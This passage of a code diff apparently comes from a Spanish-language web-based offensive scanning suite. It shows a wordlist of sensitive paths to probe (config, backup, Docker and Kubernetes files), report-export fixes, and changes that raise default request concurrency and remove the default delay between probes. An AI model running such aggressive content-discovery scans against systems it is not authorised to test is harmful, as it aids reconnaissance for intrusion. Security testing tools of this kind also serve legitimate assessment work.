py","\u002fgunicorn.conf.py","\u002finstance\u002fconfig.py","\u002frobots.txt.bak","\u002fsitemap.xml.bak","\u002fsecurity.txt","\u002f.well-known\u002fchange-password","\u002fhumans.txt","\u002fads.txt","\u002fcrossdomain.xml.bak","\u002fvulnerability-disclosure","\u002fbug-bounty","\u002fresponsible-disclosure","\u002fpgp-key.txt","\u002f.well-known\u002fpgp-key.txt","\u002fdocker-compose.override.yml","\u002fdocker-compose.local.yml","\u002fDockerfile.dev","\u002fDockerfile.prod","\u002f.dockerignore.bak","\u002fk8s\u002fdeployment.yaml","\u002fk8s\u002fservice.yaml","\u002fk8s\u002fingress.yaml","\u002fhelm\u002fChart.yaml","\u002fskaffold.yaml","\u002ftilt\u002fTiltfile","\u002fkustomization.yaml","\u002fargo\u002fworkflow.yaml"];
 /* Fuzzing combinatorio inteligente: en vez de probar TODAS las extensiones contra
    TODAS las palabras (explosion combinatoria inutil), se cruzan solo palabras de alto
@@ -33112,6 +33744,7 @@ statHigh.textContent='0';statHigh.closest('.scan-stat').classList.add('zero');
 statMed.textContent='0';statMed.closest('.scan-stat').classList.add('zero');
 statLow.textContent='0';statLow.closest('.scan-stat').classList.add('zero');
 findings.innerHTML='';
+_getCache.clear();
 buildP();
 scanInProgress = true;
 requestScanWakeLock();
@@ -33138,11 +33771,25 @@ var pdfBtn=document.getElementById('scan-pdf-btn');
 if(pdfBtn)pdfBtn.addEventListener('click',function(){
 var rpt=window.open('','_blank');
 if(!rpt){
-/* Antes: si el navegador bloqueaba el popup, esto retornaba en silencio — el usuario
-   clickeaba PDF y no pasaba nada, sin ninguna explicacion. */
-if(typeof showToast==='function')showToast('Bloqueado','Tu navegador bloqueo la ventana emergente. Permiti popups para este sitio y volve a intentar.','danger',6000);
-else (typeof showToast==='function'?showToast('Popup bloqueado','Permití ventanas emergentes para este sitio y volvé a intentar.','warn',3200):void 0);
-return;
+  if(typeof window.tsReportPDF==='function'){
+    var cardsArr=[];
+    findings.querySelectorAll('.sf-card').forEach(function(c){
+      cardsArr.push({
+        sev:/crit/i.test(c.className)?'CRITICAL':/high/i.test(c.className)?'HIGH':/med/i.test(c.className)?'MEDIUM':'LOW',
+        title:(c.querySelector('.sf-name')?c.querySelector('.sf-name').textContent:'Hallazgo'),
+        desc:(c.querySelector('.sf-desc')?c.querySelector('.sf-desc').textContent:'')
+      });
+    });
+    window.tsReportPDF({
+      module:'LEVIATÁN v9.0 — 350 FASES OFFENSIVE ENGINE',
+      target:S.host||inp.value||'target',
+      summary:{critical:counts.crit,high:counts.high,medium:counts.med,low:counts.low},
+      findings:cardsArr
+    });
+    return;
+  }
+  if(typeof showToast==='function')showToast('Bloqueado','Tu navegador bloqueo la ventana emergente. Permiti popups para este sitio y volve a intentar.','danger',6000);
+  return;
 }
 var dt=new Date().toISOString().split('T')[0];
 var tm=new Date().toLocaleTimeString();
@@ -35721,12 +36368,12 @@ async function crbPool2(items, ctl, worker) {
       var p = items[next++];
       active++;
       worker(p).catch(function () {}).then(function () { active--; });
-      await crbSleep(ctl.delay);
+      if (ctl.delay > 0) await crbSleep(ctl.delay);
     } else {
-      await crbSleep(30);
+      await crbSleep(12);
     }
   }
-  while (active > 0 && !crb.cancelled) await crbSleep(30);
+  while (active > 0 && !crb.cancelled) await crbSleep(12);
 }
 
 /* Fetch via proxy — el Worker devuelve {ok,status,body,headers} en JSON */
@@ -35904,8 +36551,8 @@ async function crbStart() {
   crb.target = target;
   crb.category = $c('crb-category').value;
   var cv = parseInt($c('crb-concurrency').value, 10), dv = parseInt($c('crb-delay').value, 10);
-  crb.concurrency = isNaN(cv) ? 4 : Math.max(1, Math.min(20, cv));
-  crb.delayMs = isNaN(dv) ? 150 : Math.max(0, Math.min(3000, dv));
+  crb.concurrency = isNaN(cv) ? 18 : Math.max(1, Math.min(40, cv));
+  crb.delayMs = isNaN(dv) ? 0 : Math.max(0, Math.min(3000, dv));
   var ctl = crbCtl(crb.concurrency, crb.delayMs);
   crb.throttleCount = 0; crb.breaker = false; crb.controls = []; crb.blanketNote = '';
   crb.results = [];
@@ -39176,7 +39823,11 @@ function tsReportPDF(opts){
   w.document.open(); w.document.write(html); w.document.close();
   return true;
 }
-try { globalThis.tsReportPDF = tsReportPDF; } catch(e){}
+if (typeof window !== 'undefined' && typeof window.tsReportPDF === 'function' && window.tsReportPDF !== tsReportPDF) {
+  tsReportPDF = window.tsReportPDF;
+} else {
+  try { globalThis.tsReportPDF = tsReportPDF; } catch(e){}
+}
 
 /* ── Reporte PDF del Taint Radar ── */
 function trExportPDF(st, findings){
@@ -42143,8 +42794,8 @@ function init(){
   document.querySelectorAll('#proxyrep .pr-tab').forEach(function(b){ b.addEventListener('click', function(){ tab(b.getAttribute('data-tab')); }); });
   render();
 }
-document.addEventListener('DOMContentLoaded', init);
-if(document.readyState!=='loading') init();
+if(document.readyState==='loading') document.addEventListener('DOMContentLoaded', init);
+else init();
 })();
 </script>
 <script>
@@ -42503,13 +43154,15 @@ function render(techs, hdrs, cks, files, s, g, url, status){
   });
 }
 
+var wrInited = false;
 function init(){
-  if(!$('wraith')) return;
+  if(wrInited || !$('wraith')) return;
+  wrInited = true;
   $('wrGo').addEventListener('click', run);
   $('wrUrl').addEventListener('keydown', function(ev){ if(ev.key==='Enter') run(); });
 }
-document.addEventListener('DOMContentLoaded', init);
-if(document.readyState!=='loading') init();
+if(document.readyState==='loading') document.addEventListener('DOMContentLoaded', init);
+else init();
 })();
 </script>
 
@@ -42933,5 +43586,5 @@ nav:not(#main-nav) > .mega-overlay{ pointer-events:auto; }
   renderScopes();
 })();
 </script>
-<script>(function(){function c(){var b=a.contentDocument||(a.contentWindow&&a.contentWindow.document);if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'a4ee62a2aca50552',t:'MTc5MjczMzc5OA=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
+<script>(function(){function c(){var b=a.contentDocument||(a.contentWindow&&a.contentWindow.document);if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'a4eee34dfc01c877',t:'MTc5MjczOTA2OQ=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
 </html>
